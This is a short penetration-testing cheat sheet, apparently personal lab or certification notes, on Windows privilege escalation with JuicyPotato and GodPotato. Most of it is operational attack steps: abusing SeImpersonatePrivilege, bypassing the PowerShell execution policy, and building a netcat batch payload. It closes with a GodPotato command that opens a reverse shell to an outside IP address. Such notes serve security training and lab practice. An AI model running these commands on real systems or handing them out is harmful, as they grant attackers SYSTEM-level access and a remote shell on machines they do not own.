# 4. JuicyPotato



1. `whoami /priv`
2. SeImpersonatePrivilege is enabled
3. Transfer JuicyPotato.exe and getCLSID.ps1
4. powershell -ep bypass -file getCLSID.ps1                                 ( which will create directory )
5. transfer nc.exe
6. make payload (msfvenom, bat etc)                                           ( e.g. echo C:\Users\Public\nc.exe -e cmd.exe kali-ip 9999 > priv.bat )
7. JuicyPotato.exe -p priv.bat -l 9999 -t \* -c {CLSID}                 ( may need to try many ) ( start nc listener )



Juicy Potato Ref:

[https://ohpe.it/juicy-potato/CLSID/](https://ohpe.it/juicy-potato/CLSID/)

[https://medium.com/r3d-buck3t/impersonating-privileges-with-juicy-potato-e5896b20d505](https://medium.com/r3d-buck3t/impersonating-privileges-with-juicy-potato-e5896b20d505)



> [!NOTE]
> JuicyPotato doesn't work on Windows Server 2019 and Windows 10 build 1809 onwards.


```
GodPotato.exe -cmd "cmd /c C:\tmp\nc.exe -e cmd.exe 192.168.45.216 5555"
```

